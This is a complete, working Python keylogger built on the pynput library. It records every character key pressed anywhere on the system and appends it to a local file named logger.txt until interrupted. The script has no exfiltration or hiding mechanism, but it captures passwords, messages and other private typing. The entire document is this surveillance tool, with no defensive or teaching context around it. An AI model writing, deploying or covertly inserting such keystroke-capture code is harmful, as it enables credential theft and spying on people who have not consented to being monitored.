from pynput import keyboard

def key_pressed(key):
    with open("logger.txt", 'a') as logfile:
        try:
            char = key.char
            logfile.write(char)
        except AttributeError:
            # Ignore non-character keys
            pass
        except Exception as e:
            print("An error occurred:", str(e))

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    
    # Wait for the listener to stop
    try:
        listener.join()
    except KeyboardInterrupt:
        # Stop the listener when Ctrl+C is pressed
        listener.stop()
